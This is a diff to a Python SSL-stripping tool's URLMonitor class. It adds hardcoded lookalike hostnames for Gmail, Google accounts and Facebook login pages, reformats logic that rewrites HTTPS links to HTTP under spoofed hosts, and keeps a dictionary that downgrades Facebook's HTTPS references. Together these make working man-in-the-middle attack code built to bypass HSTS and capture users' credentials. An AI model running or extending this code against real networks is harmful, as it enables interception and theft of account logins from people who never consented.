@@ -16,15 +16,27 @@ class URLMonitor:
     sustitucion 	   = {} # LEO: diccionario host / sustitucion
     real		   = {} # LEO: diccionario host / real
     patchDict	   = {
-    		'https:\/\/fbstatic-a.akamaihd.net':'http:\/\/webfbstatic-a.akamaihd.net',
-    		'https:\/\/www.facebook.com':'http:\/\/wwww.facebook.com',
-    		'return"https:"':'return"http:"'
-    		}
+            'https:\/\/fbstatic-a.akamaihd.net':'http:\/\/webfbstatic-a.akamaihd.net',
+            'https:\/\/www.facebook.com':'http:\/\/wwww.facebook.com',
+            'return"https:"':'return"http:"'
+            }
 
     def __init__(self):
         self.strippedURLs       = set()
         self.strippedURLPorts   = {}
         self.faviconReplacement = False
+        self.sustitucion["mail.google.com"] = "gmail.google.com"
+        self.real["gmail.google.com"] = "mail.google.com"
+
+        self.sustitucion["www.facebook.com"] = "social.facebook.com"
+        self.real["social.facebook.com"] = "www.facebook.com"
+
+        self.sustitucion["accounts.google.com"] = "cuentas.google.com"
+        self.real["cuentas.google.com"] = "accounts.google.com"
+
+        self.sustitucion["accounts.google.es"] = "cuentas.google.es"
+        self.real["cuentas.google.es"] = "accounts.google.es"
+
         
     def isSecureLink(self, client, url):
         for expression in URLMonitor.javascriptTrickery:
@@ -58,20 +70,20 @@ class URLMonitor:
             if len(port) == 0:
                 port = 443
 
-		#LEO: Sustituir HOST
+        #LEO: Sustituir HOST
         if not self.sustitucion.has_key(host):
-        	lhost = host[:4]
-        	if lhost=="www.":
-        		self.sustitucion[host] = "w"+host
-        		self.real["w"+host] = host
-        	else:
-        		self.sustitucion[host] = "web"+host
-        		self.real["web"+host] = host
-        	logging.debug("LEO: ssl host      (%s) tokenized (%s)" % (host,self.sustitucion[host]) )
-        		
+            lhost = host[:4]
+            if lhost=="www.":
+                self.sustitucion[host] = "w"+host
+                self.real["w"+host] = host
+            else:
+                self.sustitucion[host] = "web"+host
+                self.real["web"+host] = host
+            logging.debug("LEO: ssl host      (%s) tokenized (%s)" % (host,self.sustitucion[host]) )
+
         url = 'http://' + host + path
         #logging.debug("LEO stripped URL: %s %s"%(client, url))
-		
+
         self.strippedURLs.add((client, url))
         self.strippedURLPorts[(client, url)] = int(port)
         return 'http://'+self.sustitucion[host]+path
@@ -86,13 +98,13 @@ class URLMonitor:
         return ((self.faviconSpoofing == True) and (url.find("favicon-x-favicon-x.ico") != -1))
 
     def URLgetRealHost(self,host):
-    	logging.debug("Parsing host: %s"%host)
-    	if self.real.has_key(host):
-    		logging.debug("New host: %s"%self.real[host])
-    		return self.real[host]
-    	else:
-    		logging.debug("New host: %s"%host)
-    		return host
+        logging.debug("Parsing host: %s"%host)
+        if self.real.has_key(host):
+            logging.debug("New host: %s"%self.real[host])
+            return self.real[host]
+        else:
+            logging.debug("New host: %s"%host)
+            return host
 
     def getInstance():
         if URLMonitor._instance == None:
